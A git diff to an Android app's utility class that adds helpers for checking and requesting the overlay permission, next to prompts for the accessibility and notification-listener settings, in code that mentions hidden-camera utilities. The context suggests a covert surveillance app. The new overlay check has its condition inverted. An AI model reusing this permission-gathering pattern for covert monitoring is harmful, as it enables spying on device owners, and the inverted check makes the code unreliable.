@@ -21,6 +21,7 @@ import android.location.LocationManager;
 
 import androidx.core.app.ActivityCompat;
 
+import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.WindowManager;
@@ -166,8 +167,8 @@ public class Tools {
             activity.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
         if (isNotificationServiceNotEnabled(activity.getApplicationContext()))
             activity.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-//        if (!HiddenCameraUtils.canOverDrawOtherApps(activity.getApplicationContext()))
-//            HiddenCameraUtils.openDrawOverPermissionSetting(activity.getApplicationContext());
+        if (canOverDrawOtherApps(activity.getApplicationContext()))
+            openDrawOverPermissionSetting(activity.getApplicationContext());
         if (!simple_permissions_granted)
             ActivityCompat.requestPermissions(activity, PERMISSIONS, PERMISSION_ALL);
     }
@@ -346,5 +347,17 @@ public class Tools {
         outputBitmap = Bitmap.createBitmap(inputBitmap, 0, 0, inputBitmap.getWidth(), inputBitmap.getHeight(), matrix, true);
 
         return outputBitmap;
+    }
+
+    public static boolean canOverDrawOtherApps(Context context) {
+        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(context);
+    }
+
+    public static void openDrawOverPermissionSetting(Context context) {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
+
+        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
     }
 }
